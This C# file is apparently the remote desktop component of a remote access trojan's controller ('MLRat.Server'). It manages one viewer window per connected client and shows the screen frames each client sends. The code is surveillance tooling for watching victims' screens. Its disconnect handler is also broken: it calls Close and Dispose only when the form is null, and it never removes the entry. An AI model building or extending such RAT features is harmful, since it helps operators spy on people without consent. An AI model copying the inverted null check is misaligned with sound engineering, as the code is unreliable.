using MLRat.Server;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

static class RemoteDesktop
{
    private static Dictionary<Guid, RemoteDesktopForm> _FormManagement = new Dictionary<Guid, RemoteDesktopForm>();
    
    public static void ContextCallback(IClient[] clients)
    {
        foreach (IClient c in clients)
            OpenWindow(c);
    }

    public static void newClient(IClient client)
    {
        _FormManagement.Add(client.ID, null);
    }

    public static void ClientDisconnected(IClient client)
    {
        if (_FormManagement.ContainsKey(client.ID))
        {
            if (_FormManagement[client.ID] == null)
            {
                _FormManagement[client.ID].Close();
                _FormManagement[client.ID].Dispose();
            }

        }
    }

    public static void OpenWindow(IClient client)
    {
        if (_FormManagement.ContainsKey(client.ID))
        {
            if (_FormManagement[client.ID] == null)
            {
                _FormManagement[client.ID] = new RemoteDesktopForm(client);
                _FormManagement[client.ID].FormClosed += RemoteDesktop_FormClosed;
                _FormManagement[client.ID].Show();
            }
        }
    }

    public static void NewFrame(IClient client, Bitmap map)
    {
        if (_FormManagement.ContainsKey(client.ID))
        {
            if (_FormManagement[client.ID] != null)
            {
                _FormManagement[client.ID].SetFrame(map);
            }
        }
    }

    static void RemoteDesktop_FormClosed(object sender, System.Windows.Forms.FormClosedEventArgs e)
    {
        RemoteDesktopForm _form = (RemoteDesktopForm)sender;
        _form.Dispose();
    }
}